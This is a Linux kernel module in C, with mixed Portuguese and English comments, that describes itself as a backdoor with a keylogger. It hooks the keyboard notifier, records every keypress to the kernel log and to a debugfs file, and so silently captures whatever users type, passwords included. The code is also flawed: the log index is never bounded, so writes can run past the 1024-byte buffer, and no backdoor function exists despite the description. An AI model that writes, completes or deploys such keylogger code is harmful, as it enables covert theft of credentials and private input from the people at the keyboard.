#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/irq.h>
#include <linux/interrupt.h>
#include <linux/fs.h>
#include <linux/debugfs.h>

#define KBD_IRQ 1  // Keyboard IRQ number

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yudi Ramos");
MODULE_AUTHOR("Cauê Cermak");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("A simple backdoor with keylogger to debugfs");

static struct dentry *dir;
static struct dentry *file;
static char log_buffer[1024];  // Buffer para armazenar o log
static int log_index = 0;      // Índice atual no buffer de log

// Função para gravar no buffer de log
void write_to_log(const char *message)
{
    int len = snprintf(log_buffer + log_index, sizeof(log_buffer) - log_index, "%s", message);
    log_index += len;
}

// Função de leitura do arquivo de log
static ssize_t log_read(struct file *file, char __user *buffer, size_t count, loff_t *ppos)
{
    return simple_read_from_buffer(buffer, count, ppos, log_buffer, log_index);
}

// Estrutura de operações de arquivo para o arquivo de log
static const struct file_operations log_fops = {
    .read = log_read,
};

// Keyboard interrupt handler
irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id)
{
    struct keyboard_notifier_param *param = dev_id;

    if (param && param->value) {
        unsigned int keycode = param->value;

        // Convert keycode to char
        char key = (char)keycode;

        // Process the key as per your requirements
        printk(KERN_INFO "Key pressed: %c\n", key);

        // Store the key in a linked list or perform any other required operation

        // Write to the log buffer
        char log_message[2];  // Buffer para armazenar o caractere do log
        snprintf(log_message, sizeof(log_message), "%c", key);
        write_to_log(log_message);
    }

    return IRQ_NONE;
}

// Keyboard notifier callback
int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYSYM && param && param->down) {
        // Call the keyboard interrupt handler
        keyboard_interrupt_handler(0, param);
    }

    return NOTIFY_OK;
}

static struct notifier_block keyboard_notifier_block = {
    .notifier_call = keyboard_notifier_callback,
};

static int __init keyboard_module_init(void)
{
    int result;

    // Create the debugfs directory
    dir = debugfs_create_dir("keyboard_module", NULL);
    if (!dir) {
        printk(KERN_ERR "Failed to create debugfs directory\n");
        return -ENOENT;
    }

    // Create the log file
    file = debugfs_create_file("log", 0400, dir, NULL, &log_fops);
    if (!file) {
        printk(KERN_ERR "Failed to create debugfs file\n");
        debugfs_remove_recursive(dir);
        return -ENOENT;
    }

    // Register the keyboard notifier
    result = register_keyboard_notifier(&keyboard_notifier_block);
    if (result != 0) {
        printk(KERN_ERR "Failed to register keyboard notifier\n");
        debugfs_remove_recursive(dir);
        return result;
    }

    printk(KERN_INFO "Keyboard module initialized\n");
    return 0;
}

static void __exit keyboard_module_exit(void)
{
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&keyboard_notifier_block);

    // Remove the debugfs directory and file
    debugfs_remove_recursive(dir);

    printk(KERN_INFO "Keyboard module exited\n");
}


module_init(keyboard_module_init);
module_exit(keyboard_module_exit);

